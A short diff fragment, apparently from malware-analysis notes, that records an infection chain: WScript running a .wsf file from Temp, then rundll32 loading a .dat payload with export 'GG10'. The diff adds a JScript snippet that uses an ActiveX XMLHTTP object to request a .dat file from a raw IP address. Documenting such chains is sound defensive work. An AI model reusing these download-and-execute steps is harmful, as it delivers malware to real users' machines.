@@ -11,7 +11,11 @@
 
 Exec >
 
-WScript.exe C:\Users\Admin\AppData\Local\Temp\ProjectFunding_B341_Apr28.wsf"
+WScript.exe C:\Users\Admin\AppData\Local\Temp\ProjectFunding_B341_Apr28.wsf
+
+var http = new ActiveXObject("microsoft.xmlhttp");
+
+http.open("GET", "http://51.161.204.236/aLQKcPiZa3hG.dat", false);
 
 rundll32.exe C:\ProgramData\adzq5VFES.dat,GG10
 
